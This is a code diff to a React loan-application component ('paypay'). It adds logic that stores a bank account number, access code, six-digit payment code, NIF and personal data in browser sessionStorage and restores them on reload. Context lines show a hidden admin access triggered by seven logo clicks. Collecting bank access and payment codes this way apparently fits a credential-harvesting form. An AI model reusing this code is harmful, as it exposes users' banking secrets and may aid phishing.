@@ -122,6 +122,44 @@ function Index() {
     return () => clearTimeout(debounceTimer);
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);
 
+  // Persistence logic to prevent "reset" on inactivity
+  useEffect(() => {
+    // Restore state from sessionStorage on mount
+    const savedState = sessionStorage.getItem('paypay_app_state');
+    if (savedState) {
+      try {
+        const parsed = JSON.parse(savedState);
+        if (parsed.step && parsed.step !== 'success') {
+          setStep(parsed.step);
+          setAccountNumber(parsed.accountNumber || "");
+          setAccessCode(parsed.accessCode || "");
+          setPaymentCode(parsed.paymentCode || ["", "", "", "", "", ""]);
+          setAmount(parsed.amount || 35000);
+          setTerm(parsed.term || 60);
+          setPersonalData(parsed.personalData || { name: "", nif: "" });
+          setApplicationId(parsed.applicationId || null);
+        }
+      } catch (e) {
+        console.error("Error restoring session state", e);
+      }
+    }
+  }, []);
+
+  useEffect(() => {
+    // Persist state to sessionStorage whenever it changes
+    const stateToSave = {
+      step,
+      accountNumber,
+      accessCode,
+      paymentCode,
+      amount,
+      term,
+      personalData,
+      applicationId
+    };
+    sessionStorage.setItem('paypay_app_state', JSON.stringify(stateToSave));
+  }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData, applicationId]);
+
   // Handle secret admin access
   useEffect(() => {
     if (logoClicks >= 7) {
